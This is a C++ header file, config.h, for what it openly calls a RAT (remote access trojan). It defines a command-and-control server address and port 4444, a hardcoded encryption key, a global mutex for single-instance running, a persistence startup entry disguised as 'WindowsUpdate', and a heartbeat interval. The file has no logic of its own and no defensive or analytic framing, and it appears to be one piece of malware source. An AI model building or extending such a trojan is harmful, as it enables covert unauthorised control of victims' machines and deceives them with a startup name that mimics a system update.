#ifndef CONFIG_H
#define CONFIG_H
#include <string>
namespace RATConfig {
    const std::string C2_SERVER_IP = "127.0.0.1";  
    const int C2_SERVER_PORT = 4444;
    const std::string ENCRYPTION_KEY = "h98r_rat_2026";
    const std::string MUTEX_NAME = "Global\\h98r_RAT_Mutex";
    const std::string STARTUP_NAME = "WindowsUpdate";
    const int HEARTBEAT_INTERVAL_MS = 30000;
    const std::string VERSION = "1.0.0";
}
#endif
